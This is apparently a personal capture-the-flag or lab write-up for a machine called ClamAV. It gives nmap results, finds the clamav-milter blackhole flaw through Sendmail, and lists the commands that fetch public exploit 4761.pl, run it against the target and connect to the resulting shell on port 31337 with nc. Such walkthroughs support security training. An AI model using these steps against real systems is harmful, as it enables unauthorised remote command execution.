# ClamAV
# date 3-8-2023
# 192.168.247.42

# nmap
```
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
25/tcp   open     smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
80/tcp   open     http        Apache httpd 1.3.33 ((Debian GNU/Linux))
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp  open     smux        Linux SNMP multiplexer
445/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8031/tcp filtered unknown




As shown we can see ClamAV running with blackhole enabled, this is interesting as we know the name of the box is ClamAV.
Also when we query searchsploit for the sendmail server that is running on port 25 we see a reference to clamav-milter with blackhole mode.


```
# exploitation
```
└─$ searchsploit -m multiple/remote/4761.pl

We could use metasploit for this attack, but if we attempt first without it and choose the perl script. I had to remove the comments in the script and add the hashbang #!/usr/bin/perl then I could execute it with no other changes.

└─$ ./4761.pl 192.168.247.42
└─$ nc -nv 192.168.247.42 31337

```
